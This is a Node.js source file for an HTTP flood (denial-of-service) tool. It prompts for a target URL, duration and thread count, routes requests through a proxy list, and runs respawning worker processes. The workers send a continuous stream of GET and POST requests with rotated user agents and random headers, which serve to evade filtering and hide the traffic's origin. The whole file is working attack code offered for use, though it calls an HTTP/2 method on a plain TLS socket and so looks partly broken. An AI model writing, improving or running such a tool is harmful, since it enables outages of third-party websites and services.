const http = require('http');
const tls = require('tls');
const cluster = require('cluster');
const fs = require('fs');
const os = require('os');
const crypto = require('crypto');
const readline = require('readline');

// Set process limits
require("events").EventEmitter.defaultMaxListeners = Number.MAX_VALUE;
process.setMaxListeners(0);

process.on('uncaughtException', (e) => console.log(e));
process.on('unhandledRejection', (e) => console.log(e));

// Check for proxies_ipv4.txt in the current folder
const proxyFilePath = './proxies_ipv4.txt';
if (!fs.existsSync(proxyFilePath)) {
    console.error('Error: proxies_ipv4.txt file not found in the current folder.');
    process.exit(1);
}

// Read proxies from the detected file
const proxies_ipv4 = fs.readFileSync(proxyFilePath, 'utf-8').toString().replace(/\r/g, '').split('\n');

// Create a function to capture user input
const getUserInputs = async () => {
    const rl = readline.createInterface({
        input: process.stdin,
        output: process.stdout
    });

    const askQuestion = (question) => {
        return new Promise((resolve) => {
            rl.question(question, (answer) => resolve(answer));
        });
    };

    const target = await askQuestion('Enter the target URL: ');
    const time = await askQuestion('Enter the duration in seconds: ');
    const threads = await askQuestion('Enter the number of threads: ');

    rl.close();
    return { target, time, threads };
};

// Main function
const main = async () => {
    const { target, time, threads } = await getUserInputs();

    if (!target || !time || !threads) {
        console.error('Error: All inputs (target, time, threads) are required!');
        process.exit(1);
    }

    const url = new URL(target);

    const userAgents = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
        'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0',
        'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:101.0) Gecko/20100101 Firefox/101.0',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15A372 Safari/604.1',
        'Mozilla/5.0 (Linux; Android 10; SM-G975F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Mobile Safari/537.36',
    ];

    const getRandomUserAgent = () => userAgents[Math.floor(Math.random() * userAgents.length)];
    const getRandomChar = () => 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'[Math.floor(Math.random() * 62)];
    const generateRandomString = (length) => Array.from({ length }, () => getRandomChar()).join('');

    const randomizeHeaders = () => ({
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "en-US,en;q=0.9",
        "Cache-Control": "max-age=0",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": getRandomUserAgent(),
        [`Header-${getRandomChar()}`]: generateRandomString(10)
    });

    if (cluster.isMaster) {
        Array.from({ length: threads }, (_, i) => cluster.fork({ core: i % os.cpus().length }));
        cluster.on('exit', (worker) => {
            cluster.fork({ core: worker.id % os.cpus().length });
        });

        setTimeout(() => process.exit(1), time * 1000);
    } else {
        setInterval(() => {
            const [proxyHost, proxyPort] = proxies_ipv4[Math.floor(Math.random() * proxies_ipv4.length)].split(':');

            const agent = new http.Agent({
                keepAlive: true,
                maxSockets: Infinity,
                timeout: time * 1000,
            });

            const headers = randomizeHeaders();
            const method = Math.random() < 0.5 ? 'GET' : 'POST';
            const postData = method === 'POST' ? generateRandomString(50) : null;

            const request = http.get({
                method: 'CONNECT',
                host: proxyHost,
                port: proxyPort,
                agent,
                path: `${url.host}:443`,
                headers: { 'Proxy-Connection': 'Keep-Alive' },
                rejectUnauthorized: true,
            });

            request.on('connect', (res, socket) => {
                if (!socket) return;
                const session = tls.connect({
                    socket,
                    ALPNProtocols: ['h2'],
                    servername: url.host,
                    rejectUnauthorized: false
                });

                session.on('error', () => session.destroy());
                session.on('connect', () => {
                    const req = session.request({ ...headers, ':method': method, ':path': url.pathname });
                    req.end(postData);
                });
            });

            request.on('error', (err) => console.error(err));
            request.end();
        }, 1000 / threads);
    }
};

main();